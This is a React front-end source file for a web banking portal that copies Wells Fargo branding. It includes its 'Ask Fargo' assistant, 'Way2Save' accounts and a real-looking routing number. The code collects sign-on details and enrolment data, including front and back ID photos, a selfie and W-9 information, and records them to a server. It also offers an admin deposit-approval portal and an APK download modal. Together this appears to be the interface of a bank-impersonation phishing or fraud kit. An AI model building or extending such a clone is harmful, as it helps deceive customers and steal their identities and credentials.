import React, { useState } from 'react';
import { INITIAL_USER_DATA } from './data/mockData';
import { UserProfile, BankAccount } from './types/banking';
import { WebBankingDashboard } from './components/portal/WebBankingDashboard';
import { WebPortalView } from './components/portal/WebPortalView';
import { SignOnModal } from './components/auth/SignOnModal';
import { AskFargoModal } from './components/mobile/AskFargoModal';
import { SignatureCardModal } from './components/portal/SignatureCardModal';
import { AccountOpenFlow } from './components/mobile/AccountOpenFlow';
import { AndroidWorkflowsModal } from './components/workflow/AndroidWorkflowsModal';
import { AdminPortalModal } from './components/admin/AdminPortalModal';
import { Sparkles, HelpCircle } from 'lucide-react';
import { authService } from './services/authService';

export default function App() {
  const [userData, setUserData] = useState<UserProfile>(INITIAL_USER_DATA);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [webSection, setWebSection] = useState<'banking' | 'public'>('public');
  const [isSignOnOpen, setIsSignOnOpen] = useState(false);
  const [isFargoOpen, setIsFargoOpen] = useState(false);
  const [isSignatureCardOpen, setIsSignatureCardOpen] = useState(false);
  const [isAccountOpenFlowActive, setIsAccountOpenFlowActive] = useState(false);
  const [isWorkflowsOpen, setIsWorkflowsOpen] = useState(false);
  const [isAdminPortalOpen, setIsAdminPortalOpen] = useState(false);
  const [justSignedOff, setJustSignedOff] = useState(false);

  React.useEffect(() => {
    const handleNavigation = () => {
      try {
        const pathname = window.location.pathname.toLowerCase();
        const hash = window.location.hash.toLowerCase();

        if (pathname.includes('/admin') || hash.includes('admin')) {
          setIsAdminPortalOpen(true);
        } else if (pathname.includes('/login') || pathname.includes('/signon')) {
          setIsSignOnOpen(true);
        } else if (pathname.includes('/portal') || pathname.includes('/dashboard') || pathname.includes('/banking')) {
          setIsSignOnOpen(true);
        } else if (pathname.includes('/enroll') || pathname.includes('/signature-card') || pathname.includes('/apply')) {
          setIsSignatureCardOpen(true);
        } else if (pathname.includes('/fargo')) {
          setIsFargoOpen(true);
        } else if (pathname.includes('/workflows') || pathname.includes('/apk') || pathname.includes('/android')) {
          setIsWorkflowsOpen(true);
        }

        if (hash.includes('workflow') || hash.includes('apk') || hash.includes('android')) {
          setIsWorkflowsOpen(true);
        }

        if (hash.includes('#path=')) {
          const decoded = decodeURIComponent(hash.replace('#path=', ''));
          if (decoded.includes('/admin')) setIsAdminPortalOpen(true);
          if (decoded.includes('/login')) setIsSignOnOpen(true);
          if (decoded.includes('/enroll')) setIsSignatureCardOpen(true);
          if (decoded.includes('/workflows') || decoded.includes('/apk')) setIsWorkflowsOpen(true);
          if (decoded.includes('/portal') || decoded.includes('/dashboard')) {
            setIsSignOnOpen(true);
          }
        }
      } catch (e) {
        // Safe fallback
      }
    };

    handleNavigation();
    window.addEventListener('hashchange', handleNavigation);
    window.addEventListener('popstate', handleNavigation);
    return () => {
      window.removeEventListener('hashchange', handleNavigation);
      window.removeEventListener('popstate', handleNavigation);
    };
  }, []);

  const handleLoginSuccess = async (enteredName: string, profileData?: any) => {
    setIsLoggedIn(true);
    setWebSection('banking');
    setJustSignedOff(false);

    if (profileData) {
      setUserData(profileData);
      return;
    }

    const localUser = authService.findUserByUsername(enteredName);
    if (localUser?.profile) {
      setUserData(localUser.profile);
      return;
    }

    try {
      const res = await fetch(`/api/user/${encodeURIComponent(enteredName)}`);
      const data = await res.json();
      if (data.success && data.user?.profile) {
        setUserData(data.user.profile);
        return;
      }
    } catch {
      // safe fallback
    }
  };

  const handleSignOff = () => {
    setIsLoggedIn(false);
    setWebSection('public');
    setIsSignOnOpen(false);
    setIsFargoOpen(false);
    setIsSignatureCardOpen(false);
    setIsAccountOpenFlowActive(false);
    setJustSignedOff(true);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleEnrollSuccess = (newCustomerName: string, accountType?: string, fullData?: any) => {
    setIsSignatureCardOpen(false);
    setIsLoggedIn(true);
    setWebSection('banking');

    // Create fresh zero-dollar balance accounts for the newly registered user
    const checkingNum = Math.floor(1000 + Math.random() * 9000).toString();
    const savingsNum = Math.floor(1000 + Math.random() * 9000).toString();

    const zeroAccounts: BankAccount[] = [
      {
        id: `checking-${checkingNum}`,
        name: 'EVERYDAY CHECKING',
        accountNumber: `..${checkingNum}`,
        routingNumber: '061000227',
        type: 'checking',
        availableBalance: 0.00,
        currentBalance: 0.00,
        transactions: [],
      },
      {
        id: `savings-${savingsNum}`,
        name: 'WAY2SAVE SAVINGS',
        accountNumber: `..${savingsNum}`,
        routingNumber: '061000227',
        type: 'savings',
        availableBalance: 0.00,
        currentBalance: 0.00,
        transactions: [],
      },
    ];

    const newProfile: UserProfile = {
      name: newCustomerName,
      avatarUrl: fullData?.selfieUrl || fullData?.idPhotoUrl,
      idPhotoUrl: fullData?.idPhotoUrl,
      idPhotoBackUrl: fullData?.idPhotoBackUrl,
      idType: fullData?.c1PrimaryIdDesc,
      greetingTime: 'morning',
      ficoScore: 780,
      ficoChange: 0,
      ficoUpdatedDate: new Date().toLocaleDateString('en-US'),
      unreadNotifications: 1,
      bonusCode: 'JA23OU',
      accounts: zeroAccounts,
      bills: [],
      recentDeposits: [],
      treasuryHoldings: [],
      voiceNotes: [],
      registrationData: fullData,
    };

    // Immediately record to live unified database (server + local storage)
    authService.recordOrUpdateUser(
      fullData?.username || newCustomerName,
      newProfile,
      fullData
    );

    setUserData(newProfile);
    setIsAccountOpenFlowActive(true);
  };

  const handleDepositApproved = (depositId: string, updatedUser?: any) => {
    if (updatedUser?.profile) {
      setUserData(updatedUser.profile);
    } else {
      // Refresh current user data from server
      fetch(`/api/user/${encodeURIComponent(userData.name)}`)
        .then((res) => res.json())
        .then((data) => {
          if (data.user?.profile) {
            setUserData(data.user.profile);
          }
        })
        .catch(() => {});
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col font-sans selection:bg-[#d71e28] selection:text-white">
      {/* Main Content: Web Banking Portal & Dashboard */}
      <div className="flex-1 w-full">
        {webSection === 'banking' && isLoggedIn ? (
          <WebBankingDashboard
            userData={userData}
            onUpdateUserData={setUserData}
            onSignOff={handleSignOff}
            onOpenPublicPortal={() => setWebSection('public')}
            onOpenSignatureCard={() => setIsSignatureCardOpen(true)}
            onOpenAccountOpenFlow={() => setIsAccountOpenFlowActive(true)}
            onOpenAskFargo={() => setIsFargoOpen(true)}
            onOpenWorkflows={() => setIsWorkflowsOpen(true)}
            onOpenAdminPortal={() => setIsAdminPortalOpen(true)}
          />
        ) : (
          <WebPortalView
            onOpenSignOn={() => {
              setJustSignedOff(false);
              setIsSignOnOpen(true);
            }}
            onOpenAccountForm={() => setIsSignatureCardOpen(true)}
            onOpenFargoInsights={() => setIsFargoOpen(true)}
            onOpenSignatureCard={() => setIsSignatureCardOpen(true)}
            onOpenDashboard={() => {
              if (isLoggedIn) {
                setWebSection('banking');
              } else {
                setIsSignOnOpen(true);
              }
            }}
            onOpenWorkflows={() => setIsWorkflowsOpen(true)}
            onOpenAdminPortal={() => setIsAdminPortalOpen(true)}
            isLoggedIn={isLoggedIn}
            userName={userData.name}
            userData={userData}
            onUpdateUserData={setUserData}
            justSignedOff={justSignedOff}
            onDismissSignedOff={() => setJustSignedOff(false)}
          />
        )}
      </div>

      {/* Sign On Modal with scenic background */}
      <SignOnModal
        isOpen={isSignOnOpen}
        onClose={() => setIsSignOnOpen(false)}
        onLoginSuccess={handleLoginSuccess}
        onOpenEnroll={() => setIsSignatureCardOpen(true)}
        onOpenAdminPortal={() => setIsAdminPortalOpen(true)}
      />

      {/* Ask Fargo AI Assistant Modal */}
      <AskFargoModal
        isOpen={isFargoOpen}
        onClose={() => setIsFargoOpen(false)}
        userData={userData}
        onNavigateToTab={() => {
          setWebSection('banking');
          setIsFargoOpen(false);
        }}
      />

      {/* Signature Card Modal (Consumer Account Application Form W-9) */}
      <SignatureCardModal
        isOpen={isSignatureCardOpen}
        onClose={() => setIsSignatureCardOpen(false)}
        customerName={`${userData.name}`}
        onEnrollSuccess={handleEnrollSuccess}
      />

      {/* Admin Operations & Deposit Approval Portal */}
      <AdminPortalModal
        isOpen={isAdminPortalOpen}
        onClose={() => {
          setIsAdminPortalOpen(false);
          if (window.location.hash.toLowerCase().includes('admin')) {
            window.history.replaceState(null, '', window.location.pathname + window.location.search);
          }
        }}
        onDepositApproved={handleDepositApproved}
      />

      {/* Android Workflows & APK Modal */}
      <AndroidWorkflowsModal
        isOpen={isWorkflowsOpen}
        onClose={() => setIsWorkflowsOpen(false)}
      />

      {/* Account Open Flow Modal (Your Account Is Open! JA23OU) */}
      {isAccountOpenFlowActive && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-2 sm:p-4 overflow-y-auto">
          <div className="w-full max-w-lg bg-white rounded-2xl shadow-2xl overflow-hidden animate-in zoom-in-95">
            <AccountOpenFlow
              customerName={`${userData.name}`}
              onContinue={() => {
                setIsAccountOpenFlowActive(false);
                setWebSection('banking');
              }}
            />
          </div>
        </div>
      )}
    </div>
  );
}
